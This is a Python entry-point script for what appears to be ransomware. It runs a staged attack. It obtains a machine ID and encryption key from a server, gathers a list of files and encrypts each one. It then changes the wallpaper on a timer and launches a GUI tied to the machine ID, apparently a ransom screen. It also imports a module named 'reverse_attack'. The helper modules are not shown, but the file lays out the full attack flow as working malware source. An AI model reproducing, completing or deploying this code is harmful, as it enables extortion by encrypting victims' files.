#!/usr/bin/env python

import threading

#Self Written Modules To Perform Various Stages
import stage1, stage2, stage3, reverse_attack    

#After Stage Self Written Modules
from after_stage1 import changeWallpaper   
from after_stage2 import GUI

import configparser  

class Main:

    def run_stage1(self, server=None, username=None, password=None, db_name=None):
        if server==None or username==None or password==None or db_name==None:            
            start_stage1 = stage1.Stage1()  #Making object of Stage1 Class
        else:
            start_stage1 = stage1.Stage1(server, username, password, db_name) 
            
        unique_machine_id, key = start_stage1.start() #Starting Stage1
        return unique_machine_id, key

    def run_stage2(self):
        start_stage2 = stage2.Stage2()   #Making object of Stage2 Class
        list_of_files = start_stage2.start()  #Starting Stage1
        return list_of_files
        
    def run_stage3(self, key, path):
        start_stage3 = stage3.Encryptor(key, path)  #Making object of Encryptor Class  [Main Process]
        start_stage3.encrypt_file() #Starts Encryption Process

    def after_stage_change_wallpaper(self, image_dir):
        parser = configparser.RawConfigParser()
        config_file = 'config.txt'
        parser.read(config_file)
        time_in_sec = parser.get('Time_Interval_TO_Change_Wallpaper', 'time_sec') #Retriving from config.txt
    
        change_wallpaper = changeWallpaper.ChangeWallpaper(image_dir)
        change_wallpaper.time_to_change_wallpaper(int(time_in_sec))    #Changing wallpaper after every given interval of time

    def start_gui(self, machine_id):
        GUI.start_gui(machine_id)       
       

if __name__ == '__main__':
    test = Main()

    print("\n[*] Initiating Stage 1 ...")
    try:
        unique_machine_id, key = test.run_stage1()
    except Exception:
        print("[!] Unable to Connect to Server!")
        quit()
    print("[+] Completed Successfully!")
        
    print("\n[*] Initiating Stage 2 ...")
    list_of_files = test.run_stage2()
    print("[+] Completed Successfully!")

    print("\n[*] Initiating Stage 3 ...")
    for file in list_of_files:
        test.run_stage3(key, file)
    print("[+] Completed Successfully!")  

    print("\n[*] Initiating After Stage 1...")
    t1 = threading.Thread(target=test.after_stage_change_wallpaper, args=['after_stage1',])
    t1.start()
        
    print("\n[*] Initiating After Stage 2...")
    t2 = threading.Thread(target=test.start_gui, args=[unique_machine_id,])
    t2.start()        

        

        
    
    